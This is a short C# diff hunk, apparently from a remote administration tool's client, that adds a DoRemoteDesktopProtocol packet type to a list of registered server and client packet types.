@@ -57,6 +57,7 @@ namespace xClient.Core.Packets
                 typeof (Packets.ServerPackets.SetAuthenticationSuccess),
                 typeof (Packets.ServerPackets.GetConnections),
                 typeof (Packets.ServerPackets.DoCloseConnection),
+                typeof(Packets.ServerPackets.DoRemoteDesktopProtocol),
                 typeof (Packets.ClientPackets.GetAuthenticationResponse),
                 typeof (Packets.ClientPackets.SetStatus),
                 typeof (Packets.ClientPackets.SetStatusFileManager),
